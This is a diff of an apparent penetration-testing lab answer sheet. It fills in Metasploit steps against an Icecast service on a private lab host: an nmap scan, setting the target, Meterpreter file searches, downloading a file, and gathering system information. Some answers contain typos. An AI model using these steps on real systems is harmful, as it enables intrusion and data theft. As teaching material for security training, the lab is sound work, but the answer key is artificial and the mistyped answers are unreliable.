@@ -50,7 +50,7 @@ You've been provided full access to the network and are getting ping responses f
 1. Perform a service and version scan using Nmap to determine which services are up and running:
 
   - Run the Nmap comman that performs a service and version scan against the target.
-     > Answer: nmap -sV 192.168.0.8
+     > Answer: nmap -sV 192.168.0.20
  
  
 2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
@@ -86,7 +86,7 @@ You've been provided full access to the network and are getting ping responses f
  
    - Run the command that sets the `RHOST`:
       
-     > Answer: set RHOST 192.168.0.8
+     > Answer: set RHOSTS 192.168.0.20
  
 6. Run the Icecast exploit.
  
@@ -96,19 +96,19 @@ You've been provided full access to the network and are getting ping responses f
  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
-     > Answer: 
+     > Answer: search -f *secrect*
   
  7. You should now have a Meterpreter session open.
  
     - Run the command to performs a search for the `recipe.txt` on the target:
 
-      > Answer: 
+      > Answer: search -f *receipe*
  
  
     - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
 
 
-      > Answer: 
+      > Answer: download "c:/Users/IEUSers\Documents\Drinks.receipe.txt"
  
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
@@ -122,12 +122,12 @@ You've been provided full access to the network and are getting ping responses f
  
 A. Run a Meterpreter post script that enumerates all logged on users.
 
-  > Answer:
+  > Answer: 
  
      
 B. Open a Meterpreter shell and gather system information for the target.
  
-  > Answer: 
+  > Answer: systeminfo
  
 C. Run the command that displays the target's computer system information:
 
